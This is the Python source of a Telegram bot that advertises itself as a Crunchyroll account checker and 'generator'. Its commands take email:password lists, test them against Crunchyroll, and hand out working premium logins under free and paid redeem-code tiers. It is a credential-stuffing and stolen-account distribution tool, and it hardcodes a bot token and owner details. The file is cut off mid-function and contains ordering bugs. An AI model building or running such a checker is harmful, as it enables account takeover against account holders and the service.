import json
import os
import requests
import telebot
import time
import threading
from uuid import uuid1
from datetime import datetime, timedelta
import random
import string
from telebot import types
import uuid
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from threading import Timer
from flask import Flask, request


app = Flask(__name__)

@app.route('/' + bot.token, methods=['POST'])
def get_message():
    json_str = request.stream.read().decode('UTF-8')
    update = telebot.types.Update.de_json(json_str)
    bot.process_new_updates([update])
    return '!', 200

@app.route("/", methods=['GET'])
def index():
    return "Bot is running!"
# Initialize the bot
bot = telebot.TeleBot("8024910226:AAGHYVS2iO7OcGqpxjv7uBdQM8TeM6N5rqU")

# File to store persistent data
DATA_FILE = "bot_data.json"

data = {
    "authorized_users": [],
    "free_users": [],
    "user_limits": {},
    "cooldown": {},
    "cooldown_time": 30,
    "mchk_max_free": 3,
    "authorized_limit": 100,
    "total_users": 0,
    "pending_gift": {},
    "gift_messages": {}, 
    "redeem_codes": {},
    "account_stock": [],
    "user_data": {},
    "redeemed_accounts": [],
    "owner_id": "5727462573",
    "USER_COOLDOWN": 21600,
    "ACCOUNT_LIMIT": 1,
    "owner_id2": 5727462573,
}


def list_add(lst, item):
    if item not in lst:
        lst.append(item)

def list_remove(lst, item):
    if item in lst:
        lst.remove(item)

def make_json_compatible(data):
    """
    Convert datetime objects into string format for JSON serialization.
    """
    if isinstance(data, datetime):
        return data.isoformat()  # Convert datetime to string in ISO format
    elif isinstance(data, dict):
        return {key: make_json_compatible(value) for key, value in data.items()}
    elif isinstance(data, list):
        return [make_json_compatible(item) for item in data]
    else:
        return data

def parse_datetime(data):
    """
    Convert ISO formatted datetime string back to datetime object.
    """
    if isinstance(data, str):
        try:
            # Try to parse it as datetime (using isoformat string)
            return datetime.fromisoformat(data)
        except ValueError:
            return data
    elif isinstance(data, dict):
        return {key: parse_datetime(value) for key, value in data.items()}
    elif isinstance(data, list):
        return [parse_datetime(item) for item in data]
    else:
        return data

def save_data():
    with open(DATA_FILE, "w") as file:
        json.dump(make_json_compatible(data), file, indent=4)
    print("Data saved to file.")

def load_data():
    global data
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as file:
            saved_data = json.load(file)
            data.update(parse_datetime(saved_data))  # Convert strings back to datetime objects
        print("Data loaded from file.")

def load_data():
    global data
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as file:
            content = file.read()
            if not content.strip():  # If the file is empty, reset data to default
                print("Warning: The file is empty. Initializing default data.")
                return  # Prevent loading any invalid or empty data

            try:
                saved_data = json.loads(content)
                data.update(parse_datetime(saved_data))  # Convert strings back to datetime objects
                print("Data loaded from file.")
            except json.JSONDecodeError as e:
                print(f"Error decoding JSON: {e}")
                print("The file may be corrupted. Consider resetting or fixing the JSON file.")
    else:
        print("No data file found. Initializing data with default values.")

load_data()


def auto_save():
    while True:
        save_data()
        time.sleep(10)


threading.Thread(target=auto_save, daemon=True).start()

CHANNEL_ID = "@bhainkarfeedback" 
@bot.message_handler(commands=['feedback'])
def ask_feedback(message):
    # Create inline keyboard for star ratings
    markup = types.InlineKeyboardMarkup(row_width=2)

    # Create inline buttons for 5 to 1 star ratings, with callback data for each
    stars = [
        types.InlineKeyboardButton(text="🌟🌟🌟🌟🌟", callback_data="5_star"),
        types.InlineKeyboardButton(text="🌟🌟🌟🌟", callback_data="4_star"),
        types.InlineKeyboardButton(text="⭐⭐⭐", callback_data="3_star"),
        types.InlineKeyboardButton(text="⭐⭐", callback_data="2_star"),
        types.InlineKeyboardButton(text="⭐", callback_data="1_star"),
    ]
    
    markup.add(*stars)
    bot.send_message(message.chat.id, "*✨ Hey there, friend! ✨*\n\n"
                                      "Would you mind rating the bot with the stars below? 🌟\n"
                                      "_Your feedback helps us improve the bot for you and others!_ 😊", 
                                      reply_markup=markup, parse_mode="Markdown")

# This will handle the user's star selection via inline buttons
@bot.callback_query_handler(func=lambda call: call.data.endswith("_star"))
def handle_star_rating(call):
    # Extract the number of stars from the callback data
    stars = call.data.split("_")[0]

    # Prepare the full feedback text to send to the channel
    profile_link = f"[{call.from_user.first_name}](tg://user?id={call.from_user.id})"  # Create clickable profile link
    star_emojis = "⭐" * int(stars[0])  # Multiply the star emoji by the rating
    
    # Enhanced, professional look for the feedback
    full_feedback = f"*🎯 Feedback Received* 📩\n"
    full_feedback += f"━━━━━━━━━━━━━━━━━━\n"
    full_feedback += f"*✨ Rating*: {star_emojis} ({stars} Stars)\n"
    full_feedback += f"*🧑‍💻 User*: {profile_link}\n"
    full_feedback += f"━━━━━━━━━━━━━━━━━━\n"
    full_feedback += f"⭐ {stars} star{'s' if stars != '1' else ''} ⭐\n\n"
    full_feedback += f"_Thank you for sharing your thoughts!_ 🙏"

    # Send the feedback to your channel
    bot.send_message(CHANNEL_ID, full_feedback, parse_mode="Markdown")

    # Send a thank you message to the user with improved style
    bot.send_message(call.message.chat.id, "*💬 Thank you for your feedback, awesome human! 💬*\n\n"
                                           "_Your thoughts have been recorded successfully!_ ✨\n"
                                           "Feedbacks at @bhainkarfeedback", 
                                           parse_mode="Markdown")

    # Remove the inline buttons by editing the message
    bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=None)
        
@bot.message_handler(commands=['gift'])
def initiate_gift(message):
    sender_id = message.from_user.id
    try:
        parts = message.text.split(" ", 1)
        if len(parts) < 2:
            bot.send_message(
                message.chat.id, 
                "Pʟᴇᴀsᴇ Usᴇ Tʜᴇ Fᴏʀᴍᴀᴛ:\n/gift Cʜᴀᴛ-ɪᴅ\n\nWʜᴇʀᴇ ᴛᴏ ɢᴇᴛ Cʜᴀᴛ-ɪᴅ?\nJᴜsᴛ ᴛʏᴘᴇ /lb", 
                disable_web_page_preview=True
            )
            return

        username = parts[1].lstrip('@')
        recipient = bot.get_chat(username)
        recipient_id = recipient.id

        msg = bot.send_message(message.chat.id, "Pʟᴇᴀsᴇ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴇssᴀɢᴇ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ sᴇɴᴅ ᴀs ᴀ ɢɪғᴛ.")
        bot.register_next_step_handler(msg, lambda m: process_gift_message(m, recipient_id, sender_id))

    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Eʀʀᴏʀ: {str(e)}")


def process_gift_message(message, recipient_id, sender_id):
    gift_message = message.text
    unique_id = str(uuid.uuid4())
    data["gift_messages"][unique_id] = gift_message

    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton("✅ Confirm", callback_data=f"confirm_gift:{recipient_id}:{unique_id}"),
        types.InlineKeyboardButton("❌ Cancel", callback_data="cancel_gift")
    )

    confirmation_text = f"Pʟᴇᴀsᴇ cᴏɴғɪʀᴍ ʏᴏᴜʀ ɢɪғᴛ:\n\n{gift_message}"
    bot.send_message(message.chat.id, confirmation_text, reply_markup=markup)


@bot.callback_query_handler(func=lambda call: call.data.startswith("confirm_gift") or call.data == "cancel_gift")
def handle_gift_callback(call):
    if call.data == "cancel_gift":
        bot.send_message(call.message.chat.id, "🎁 Gɪғᴛ ᴄᴀɴᴄᴇʟʟᴇᴅ.")
        bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=None)
    else:
        try:
            _, recipient_id, unique_id = call.data.split(":", 2)
            gift_message = data["gift_messages"][unique_id]

            bot.send_message(
                recipient_id, 
                f"🎁 Yᴏᴜʀ ɢɪғᴛ ғʀᴏᴍ @{call.from_user.username}:\n\n{gift_message}", 
                disable_web_page_preview=True
            )
            bot.send_message(call.message.chat.id, "🎉 Gɪғᴛ sᴇɴᴛ sᴜᴄᴄᴇssғᴜʟʟʏ!")
            bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=None)

           
            del data["gift_messages"][unique_id]

        except Exception as e:
            bot.send_message(call.message.chat.id, f"❌ Eʀʀᴏʀ: {str(e)}")
       
def anti_spam(func):
    def wrapper(message):
        user_id = message.from_user.id
        current_time = time.time()

        if str(user_id) not in data["authorized_users"]:
            if user_id in data["cooldown"] and current_time - data["cooldown"][user_id] < data["cooldown_time"]:
                bot.send_message(message.chat.id, f"Yᴏᴜ'ʀᴇ Oɴ Cᴏᴏʟᴅᴏᴡɴ! Tʀʏ Aɢᴀɪɴ Iɴ {int(data['cooldown_time'] - (current_time - data['cooldown'][user_id]))} Sᴇᴄᴏɴᴅs.", disable_web_page_preview=True)
                return
            data["cooldown"][user_id] = current_time

        return func(message)
    return wrapper

   # ---------------------------------------------------------#         					#MENU#
                                    
@bot.message_handler(commands=['menu'])
def show_menu(message):
    chat_id = message.chat.id
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📊 Stats", callback_data='stats'),
        types.InlineKeyboardButton("🏆 UserBoard", callback_data='lb'),
        types.InlineKeyboardButton("🆘 Support", callback_data='support'),
        types.InlineKeyboardButton("🔧 Account Generator", callback_data='open_gen_menu')
    )

    gif_url = "https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExem4xdWFxemdsdW1tcHc1ZDBqYTJ1Z3ZoNTU4OGZ6YjV2YTl4ZjJmayZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/jya79Gd15sb1htYBpP/giphy.gif"
    bot.send_animation(
        chat_id,
        gif_url,
        caption=(
            "<b>Choose an option to explore features and tools</b>:\n\n"
            "📊 <b>Stats</b>: Get a quick overview of bot's stats.\n\n"
            "🏆 <b>UserBoard</b>: See the top users of this bot!\n\n"
            "🆘 <b>Support</b>: Need help? Access support resources and contact options.\n\n"
            "🔧 <b>Account Generator</b>: Generate free Crunchyroll premium accounts with ease.\n\n"
            "<i>Enhance your experience by accessing these tools!</i>"
        ),
        reply_markup=markup,
        parse_mode='HTML'
    )

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if call.data == 'stats':
        stats(call.message)
    elif call.data == 'lb':
        lb(call.message)
    elif call.data == 'support':
        support(call.message)
    elif call.data == 'open_gen_menu':
        open_generator_menu(call)  # Corrected to call `open_generator_menu`
    elif call.data == 'check_stock':
        check_account_stock(call)
    elif call.data == 'add_accounts':
        add_accounts(call)
    elif call.data == 'remove_accounts':
        remove_accounts(call)
    elif call.data == 'generate_account_as_user':
        generate_account_as_user(call)
    elif call.data == 'back_to_menu':
        edit_to_main_menu(call.message)
    elif call.data == 'terminate':
        bot.delete_message(call.message.chat.id, call.message.message_id)

    else:
        bot.answer_callback_query(call.id)

def open_generator_menu(call):
    chat_id = call.message.chat.id
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📦 Check Account Stock", callback_data='check_stock'),
        types.InlineKeyboardButton("🔄 Generate Account", callback_data='generate_account_as_user')
    )
    markup.add(
        types.InlineKeyboardButton("🔙 Back", callback_data='terminate')
    )

    # Add admin-only options
    if call.from_user.id == data["owner_id2"]:
        markup.add(
            types.InlineKeyboardButton("➕ Add Accounts", callback_data='add_accounts'),
            types.InlineKeyboardButton("➖ Remove Accounts", callback_data='remove_accounts')
        )
        
    new_gif_url = "https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExcjRidmphcXA4YzQxNWRqNjFlN28wOXlsMTBxNXRzM2U5NXYyNm53eCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/k9a8EctGGl3yLKXuUC/giphy.gif"
    bot.send_animation(chat_id, new_gif_url, caption=(
        "🍿 <b>Crunchyroll Account Generator</b>\n\n"
        "Access Crunchyroll accounts quickly and easily with this tool. Here’s what you can do:\n\n"
        "📦 <b>Check Account Stock</b>: View available accounts before generating.\n"
        "🔄 <b>Generate Account</b>: Instantly redeem a Crunchyroll account.\n"
        "⚠️ <b>Cooldown Timer</b>: Stay within the cooldown period to ensure smooth access for all users.\n\n"
        "<i>Enjoy fast, seamless account generation for uninterrupted Crunchyroll streaming!</i>"
    ), reply_markup=markup, parse_mode='HTML')

# Define other callback functions as needed
def stats(message):
    bot.send_message(message.chat.id, "📊 Displaying stats...")

def lb(message):
    bot.send_message(message.chat.id, "🏆 Showing leaderboard...")

def support(message):
    bot.send_message(message.chat.id, "🆘 How can we help you?")

def check_account_stock(call):
    available_count = len(data["account_stock"])  # Access account_stock from the data dictionary
    bot.send_message(call.message.chat.id, f"📦 Current Account Stock\n{available_count} accounts available.")

def add_accounts(call):
    bot.send_message(call.message.chat.id, "➕ Add Accounts\nSend the accounts you’d like to add, one per line.")
    bot.register_next_step_handler(call.message, process_add_accounts)

def process_add_accounts(message):
    accounts = message.text.splitlines()
    formatted_accounts = [account.strip() for account in accounts if ":" in account]
    data["account_stock"].extend(formatted_accounts)
    bot.send_message(message.chat.id, f"✅ Added\n{len(formatted_accounts)} accounts.")

def remove_accounts(call):
    bot.send_message(call.message.chat.id, "➖ Remove Accounts\nSend the accounts you’d like to remove, one per line.")
    bot.register_next_step_handler(call.message, process_remove_accounts)

def process_remove_accounts(message):
    accounts = message.text.splitlines()
    removed_count = sum(1 for account in accounts if account in data["account_stock"])
    data["account_stock"][:] = [account for account in data["account_stock"] if account not in accounts]
    bot.send_message(message.chat.id, f"✅ Removed\n{removed_count} accounts.")

def generate_account_as_user(call):
    user_id = call.from_user.id
    if user_id not in data["user_data"]:
        data["user_data"][user_id] = {'last_generated': None}
    now = datetime.now()

    if data["user_data"][user_id]['last_generated'] and (now < data["user_data"][user_id]['last_generated'] + timedelta(seconds=data["USER_COOLDOWN"])):
        # Calculate the remaining cooldown time
        remaining_time = (data["user_data"][user_id]['last_generated'] + timedelta(seconds=data["USER_COOLDOWN"])) - now

        sent_message = bot.send_message(call.message.chat.id, "Calculating cooldown...")

        def update_timer():
            nonlocal sent_message
            remaining_time = (data["user_data"][user_id]['last_generated'] + timedelta(seconds=data["USER_COOLDOWN"])) - datetime.now()

            if remaining_time.total_seconds() <= 0:
                bot.edit_message_text(
                    chat_id=sent_message.chat.id,
                    message_id=sent_message.message_id,
                    text="✅ You can now generate a new account."
                )
            else:
                hours, remainder = divmod(int(remaining_time.total_seconds()), 3600)
                minutes, seconds = divmod(remainder, 60)
                try:
                    bot.edit_message_text(
                        chat_id=sent_message.chat.id,
                        message_id=sent_message.message_id,
                        text=f"⏳ Please wait {hours}h {minutes}m {seconds}s."
                    )
                except Exception as e:
                    print(f"Error updating message: {e}")
                Timer(1, update_timer).start()

        update_timer()
        return

    if not data["account_stock"]:
        bot.send_message(
            call.message.chat.id,
            "📦No Accounts Available\n⚠️ We're currently out of accounts to generate.\nPlease try again later or contact support if the issue persists."
        )
        return

    # Retrieve and check account
    while data["account_stock"]:
        account = data["account_stock"].pop(0)
        email, pasw = account.split(":", 1)
        check_result = check_crunchyroll_account(email, pasw, call.message)
        if "Cʀᴜɴᴄʜʏʀᴏʟʟ ᥫ᭡ Pʀᴇᴍɪᴜᴍ" in check_result:
            # Account is premium, send the result
            bot.send_message(call.message.chat.id, check_result, parse_mode='HTML')
            # Update user data and break out of the loop
            data["user_data"][user_id]['last_generated'] = now
            break
    else:
        # If no premium account was found
        bot.send_message(call.message.chat.id, "❌ No premium accounts found.")

        
        #------------------------------------------------#
        				#REDEEM CODES#
        
def is_authorized(user_id):
    return user_id in data["authorized_users"]

# Helper function to generate a redeem code with an expiry time
def generate_redeem_code(expiry_time):
    code = "BHAINKAR-" + ''.join(random.choices(string.ascii_uppercase + string.digits + "!@#$%^&*", k=10))
    data["redeem_codes"][code] = {'used': False, 'expiry_time': expiry_time, 'user_id': None}
    return code

# Function to remove expired users
def remove_expired_users():
    while True:
        current_time = datetime.now()
        expired_codes = [code for code, data in data["redeem_codes"].items() if data['used'] and current_time >= data['expiry_time']]
        
        for code in expired_codes:
            try:
                # Re-check if the code still exists in redeem_codes
                if code in data["redeem_codes"]:
                    user_id = data["redeem_codes"][code].get('user_id')
                    if user_id and user_id in data["authorized_users"]:
                        data["authorized_users"].remove(user_id)
                        data["free_users"].append(user_id)
                        bot.send_message(user_id, "❌ Plan Expired!\n⚡ Status: Your Bʜᴀɪɴᴋᴀʀ Pʟᴀɴ has officially expired.\n🔄 Action: You’ve been moved back to the Free Plan.\n\nUpgrade again to regain the power of the Bhainkar experience!")
                    
                    # Safely remove the expired code
                    data["redeem_codes"].pop(code, None)
            except KeyError:
                # Continue if a KeyError is raised to avoid interrupting the loop
                continue
        
        # Check every minute
        threading.Event().wait(60)

# Start a thread to handle expiration checks
threading.Thread(target=remove_expired_users, daemon=True).start()

# Command for the owner to generate a new redeem code
@bot.message_handler(commands=['gencode'])
def generate_code(message):
    user_id = str(message.from_user.id)
    
    if user_id == data["owner_id"]:
        try:
            bot.send_message(message.chat.id, "⏳ Set Expiry Duration\nPlease enter the duration in this format: days hours minutes seconds.")
            bot.register_next_step_handler(message, get_duration)
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Eʀʀᴏʀ: {str(e)}")
    else:
        bot.send_message(message.chat.id, "Yᴏᴜ Aʀᴇ Nᴏᴛ Aᴜᴛʜᴏʀɪᴢᴇᴅ Tᴏ Gᴇɴᴇʀᴀᴛᴇ Cᴏᴅᴇs.", disable_web_page_preview=True)

def get_duration(message):
    try:
        # Parse the duration from the message
        duration_parts = message.text.split()
        duration = timedelta(
            days=int(duration_parts[0]),
            hours=int(duration_parts[1]),
            minutes=int(duration_parts[2]),
            seconds=int(duration_parts[3])
        )
        expiry_time = datetime.now() + duration
        code = generate_redeem_code(expiry_time)
        
        bot.send_message(message.chat.id, f"🔑 New Redeem Code Generated!\n🏷️ Code: <code>{code}</code>\n⏳ Expiry Time: {expiry_time}\n\nUse this code before it expires to unlock your access!", parse_mode='HTML')
    except (ValueError, IndexError):
        bot.send_message(message.chat.id, "❌ Invalid Format!\nPlease use the correct format: days hours minutes seconds.")

# Command for users to redeem a code
@bot.message_handler(commands=['redeem'])
def redeem_code(message):
    user_id = str(message.from_user.id)
    try:
        code = message.text.split()[1]

        # Check if the code exists and is not used
        if code in data["redeem_codes"] and not data["redeem_codes"][code]['used']:
            # Mark the code as used and store user info
            data["redeem_codes"][code]['used'] = True
            data["redeem_codes"][code]['user_id'] = user_id
            expiry_time = data["redeem_codes"][code]['expiry_time']

            data["free_users"].remove(user_id)
            data["authorized_users"].append(user_id)

            # Notify user and owner
            bot.send_message(data["owner_id"], f"✨ Code Redeemed Successfully!\n👤 User: {user_id}\n🏷️ Redeem Code: {code}\n⏳ Expires On: {expiry_time}" ,parse_mode='HTML')
            bot.send_message(user_id, f"✅ Success!\n🎉 Status: You are now on the Bʜᴀɪɴᴋᴀʀ Pʟᴀɴ\n⏳ Expiry Time: {expiry_time}\n\nEnjoy the premium experience with your upgraded plan!", disable_web_page_preview=True, parse_mode='HTML')
        else:
            bot.send_message(user_id, "<b>❌ Invalid Code Detected!</b>\n<b>⚡ Error:</b> The code you provided is <b>invalid</b> or has already been <b>redeemed</b>.\nTry again with a valid code to unlock the Bhainkar experience.", disable_web_page_preview=True , parse_mode='HTML')
    except IndexError:
        bot.send_message(user_id, "<b>🚨 Attention Required!</b>\n<b>📌 Command to Use:</b> /redeem CODE\nEnter a valid code to activate your premium plan.\n", disable_web_page_preview=True , parse_mode='HTML')

# Start the thread to check for expired users
expiry_thread = threading.Thread(target=remove_expired_users, daemon=True)
expiry_thread.start()

@bot.message_handler(commands=['start'])
@bot.message_handler(commands=['start'])
def add_user(message):
    global total_users  # Use the global keyword to modify the global variable
    user_id = str(message.from_user.id)

    # Check if the user is already in any of the lists
    if user_id not in data["free_users"] and user_id not in data["authorized_users"]:
        # Add the user to the free users list if not already added
        data["free_users"].append(user_id)  # Correct method for adding users to a set
        
        # Update the total_users correctly by setting it based on set length
        total_users = len(data["free_users"]) + len(data["authorized_users"])  # Calculate total users

        bot.send_message(message.chat.id, "Wᴇʟᴄᴏᴍᴇ! Yᴏᴜ Hᴀᴠᴇ Bᴇᴇɴ Aᴅᴅᴇᴅ ᴀs ᴀ Fʀᴇᴇ Usᴇʀ.", disable_web_page_preview=True)
    else:
        bot.send_message(message.chat.id, "Yᴏᴜ Aʀᴇ Aʟʀᴇᴀᴅʏ ʀᴇɢɪsᴛᴇʀᴇᴅ!", disable_web_page_preview=True)
       
    chat_id = message.chat.id
    gif_url = "https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExcjR3Y3JldDhodHBhdXg4bTZyd2k4Nmt6MnQxOWhrdDR2cnJtajN1YSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/B1Lopnwqs9WIr3GtnQ/giphy.gif"
    bot.send_animation(chat_id, gif_url, caption=(
        "🎉 <b>Wᴇʟᴄᴏᴍᴇ Tᴏ CʀᴜɴᴄʜʏRᴏʟʟ Cʜᴇᴄᴋᴇʀ</b> 🎉\n"
        "\n"
        "🔍 <b>Single Check:</b> Use <code>/chk email:pass</code> to check one account.\n"
        "🔄 <b>Multi-Check:</b> Use <code>/mchk</code> to check up to 3 accounts at once.\n"
        "\n"
        "💡 <b>Fʀᴇᴇ Pʟᴀɴ:</b> 3 accounts at a time, 30s cooldown.\n"
        "🚀 <b>Bʜᴀɪɴᴋᴀʀ Pʟᴀɴ:</b> 100 accounts at once, no cooldown. DM @bhainkar for access.\n"
        "\n"
        "ℹ️ <b>Details:</b> Use /details to check your info"
        "\n"
        "👾 <b>More Features:</b> Usᴇ /menu for more features of this bot\n"
        "<i>Enjoy fast and accurate checking with</i> <b>CʀᴜɴᴄʜʏRᴏʟʟ Cʜᴇᴄᴋᴇʀ</b>!"
        "\n\n"
        "Bᴏᴛ Bʏ @bhainkar"), parse_mode='HTML')

@bot.message_handler(commands=['lb'])
def lb(message):
    bot.send_message(message.chat.id, "🏆 Showing leaderboard...")
    if not data["free_users"] and not data["authorized_users"]:
        bot.send_message(message.chat.id, "Nᴏ ᴜsᴇʀs ʏᴇᴛ.")
        return

    # Count total users
    total_users_count = len(data["free_users"]) + len(data["authorized_users"])
    
    leaderboard_message = f"👥 𝗨𝘀𝗲𝗿𝗕𝗼𝗮𝗿𝗱: {total_users_count}\n"
    
    for user_id in data["free_users"]:
        try:
            user = bot.get_chat(user_id)  # Retrieve user info
            first_name = user.first_name  # Get first name
            
            # Escape any Markdown special characters in first_name
            safe_first_name = first_name.replace('_', '\\_').replace('*', '\\*').replace('[', '\\[').replace(']', '\\]').replace('`', '\\`')
            leaderboard_message += f"- [{safe_first_name}](tg://user?id={user_id}) 𝙸𝙳: {user_id}\n"
        except Exception as e:
            print(f"Fᴀɪʟᴇᴅ ᴛᴏ ɢᴇᴛ ᴜsᴇʀ {user_id}: {e}")

    for user_id in data["authorized_users"]:
        try:
            user = bot.get_chat(user_id)  # Retrieve user info
            first_name = user.first_name  # Get first name
            
            # Escape any Markdown special characters in first_name
            safe_first_name = first_name.replace('_', '\\_').replace('*', '\\*').replace('[', '\\[').replace(']', '\\]').replace('`', '\\`')
            leaderboard_message += f"- [{safe_first_name}](tg://user?id={user_id}) 𝙸𝙳: {user_id}\n"
        except Exception as e:
            print(f"Fᴀɪʟᴇᴅ ᴛᴏ ɢᴇᴛ ᴜsᴇʀ {user_id}: {e}")

    # Send the leaderboard message
    try:
        bot.send_message(message.chat.id, leaderboard_message, parse_mode='Markdown')
    except Exception as e:
        print(f"Fᴀɪʟᴇᴅ ᴛᴏ sᴇɴᴅ ᴜsᴇʀʙᴏᴀʀᴅ ᴍᴇssᴀɢᴇ: {e}")

owner_draft = {}
@bot.message_handler(commands=['broadcast'])
def broadcast(message):
    user_id = message.from_user.id
    if str(user_id) != data["owner_id"]:
        bot.send_message(message.chat.id, "⛔ Unauthorized! Only the owner can broadcast messages.")
        return

    broadcast_message = message.text.partition(" ")[2]
    if not broadcast_message.strip():
        bot.send_message(message.chat.id, "⚠️ Please use /broadcast MESSAGE to broadcast.")
        return

    owner_draft[user_id] = broadcast_message
    bot.send_message(
        message.chat.id, 
        "✍️ Your broadcast draft has been saved.\n\nUse the following commands:\n"
        "👁 /preview - Preview the message\n"
        "📢 /send - Send the message to all users."
    )

@bot.message_handler(commands=['preview'])
def preview(message):
    user_id = message.from_user.id
    if str(user_id) != data["owner_id"]:
        bot.send_message(message.chat.id, "⛔ Unauthorized!")
        return

    broadcast_message = owner_draft.get(user_id)
    if not broadcast_message:
        bot.send_message(message.chat.id, "⚠️ No draft found. Please use /broadcast to draft a message.")
        return

    bot.send_message(message.chat.id, f"👁 <b>Broadcast Preview:</b>\n\n{broadcast_message}", parse_mode='HTML')

@bot.message_handler(commands=['send'])
def send_broadcast(message):
    global authorized_users, free_users
    user_id = message.from_user.id
    
    # Check if the user is authorized to send broadcasts
    if str(user_id) != data["owner_id"]:
        bot.send_message(message.chat.id, "⛔ Unauthorized! Only the owner can send broadcast messages.")
        return

    # Retrieve the message draft from owner_draft
    broadcast_message = owner_draft.get(user_id)
    if not broadcast_message:
        bot.send_message(message.chat.id, "⚠️ No draft found. Please create a draft using /broadcast before sending.")
        return

    sent_count = 0
    failed_count = 0

    # Concatenate the lists to create a combined list of all users
    all_users = data["authorized_users"] + data["free_users"]  # Combine authorized and free users using list concatenation
    
    # Loop through all user IDs and send messages
    for user_id in all_users:
        try:
            # Send the message and disable the link preview
            bot.send_message(user_id, broadcast_message, disable_web_page_preview=True)
            sent_count += 1
        except Exception as e:
            failed_count += 1
            print(f"Failed to send message to {user_id}: {e}")  # Log errors for debugging

    # Send confirmation to the owner
    bot.send_message(
        message.chat.id,
        f"✅ Broadcast sent successfully.\n"
        f"👥 Total: {len(all_users)}\n✅ Sent: {sent_count}\n❌ Failed: {failed_count}"
    )

    # Clear the draft after sending
    owner_draft.pop(user_id, None)

@bot.message_handler(commands=['support'])
def support(message):
    user_id = message.chat.id 
    username = message.from_user.username or 'User'
    
    user_profile_link = f'<a href="tg://user?id={user_id}">{user_id}</a>'
   
    # Support message text
    support_text = (
        f"👋 Hello, {user_profile_link}! Need assistance? We're here to help!\n\n"
        "🛠 <b>Support Options:</b>\n"
        "1. <b>Contact Support:</b> Reach out to our support team for help.\n"
        "2. <b>Community Channel:</b> Join the discussion and find solutions in our "
        "<a href='https://t.me/bhainkarchat'>Community Channel</a>.\n\n"
        "📧 <b>Email:</b> 3xzaniga@gmail.com\n"
        "💬 <b>Live Chat:</b> Start a conversation by clicking the button below."
    )
    
    # Create inline keyboard for live chat and more support options
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("💬 Start Live Chat", url="https://t.me/bhainkar"))
    
    # Send the support message with the keyboard markup
    bot.send_message(
        chat_id=user_id, 
        text=support_text, 
        parse_mode="HTML", 
        disable_web_page_preview=True, 
        reply_markup=markup
    )

@bot.message_handler(commands=['add'])
def authorize_user(message):
    user_id = str(message.from_user.id)
    if user_id != data["owner_id"]:
        bot.send_message(message.chat.id, "Unauthorized! Only the owner can authorize users.")
        return

    try:
        user_to_authorize = str(message.text.split()[1])
    except IndexError:
        bot.send_message(message.chat.id, "Provide a valid user ID to authorize.")
        return

    if user_to_authorize in data["free_users"]:
        list_remove(data["free_users"], user_to_authorize)
        list_add(data["authorized_users"], user_to_authorize)
        bot.send_message(message.chat.id, f"User {user_to_authorize} has been authorized!")
    else:
        bot.send_message(message.chat.id, "User not found in the free list.")

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.from_user.id)
    if user_id != data["owner_id"]:
        bot.send_message(message.chat.id, "Unauthorized! Only the owner can remove users.")
        return

    try:
        user_to_remove = str(message.text.split()[1])
    except IndexError:
        bot.send_message(message.chat.id, "Provide a valid user ID to remove.")
        return

    if user_to_remove in data["authorized_users"]:
        list_remove(data["authorized_users"], user_to_remove)
        list_add(data["free_users"], user_to_remove)
        bot.send_message(message.chat.id, f"User {user_to_remove} has been removed from authorized users.")
    elif user_to_remove in data["free_users"]:
        list_remove(data["free_users"], user_to_remove)
        bot.send_message(message.chat.id, f"User {user_to_remove} has been removed from free users.")
    else:
        bot.send_message(message.chat.id, "User not found.")


@bot.message_handler(commands=['stats'])
def stats(message):
    total_users = len(data["authorized_users"]) + len(data["free_users"])
    bot.send_message(
        message.chat.id,
        f"📊 𝐁𝐨𝐭 𝐒𝐭𝐚𝐭𝐢𝐬𝐭𝐢𝐜𝐬:\n\n"
        f"👥 𝗧𝗼𝘁𝗮𝗹 𝗨𝘀𝗲𝗿𝘀: {total_users}\n"
        f"🔓 𝗙𝗿𝗲𝗲 𝗣𝗹𝗮𝗻: {len(data['free_users'])}\n"
        f"🔒 𝗕𝗵𝗮𝗶𝗻𝗸𝗮𝗿 𝗣𝗹𝗮𝗻: {len(data['authorized_users'])}",
        disable_web_page_preview=True
    )
    
@bot.message_handler(commands=['chk'])
@anti_spam
def chk(message):
    user_id = str(message.from_user.id)
    current_time = time.time()

    try:
        # Parse the email and password from the message
        email, pasw = message.text.split()[1].split(':')
        
        # Check if the account format is valid
        if not check_account_format(email, pasw):
            bot.send_message(message.chat.id, "Usᴇ /chk email:pass Tᴏ Sᴛᴀʀᴛ Cʜᴇᴄᴋɪɴɢ", disable_web_page_preview=True)
            return

        # If valid account format, apply cooldown
        if user_id not in data["authorized_users"]:
            if user_id in data["cooldown"] and (current_time - data["cooldown"][user_id] < data["cooldown_time"]):
                remaining_time = int(data["cooldown_time"] - current_time - data["cooldown"][user_id])
                bot.send_message(message.chat.id, f"Yᴏᴜ'ʀᴇ Oɴ Cᴏᴏʟᴅᴏᴡɴ! Tʀʏ Aɢᴀɪɴ Iɴ {remaining_time} Sᴇᴄᴏɴᴅs.", disable_web_page_preview=True)
                return
                data["cooldown"][user_id] = current_time

        # Processing message
        bot.send_message(message.chat.id, "Pʀᴏᴄᴇssɪɴɢ...", disable_web_page_preview=True)

        # Continue with the check process
        result = check_crunchyroll_account(email, pasw, message)
        bot.send_message(message.chat.id, result, parse_mode='HTML', disable_web_page_preview=True)
        
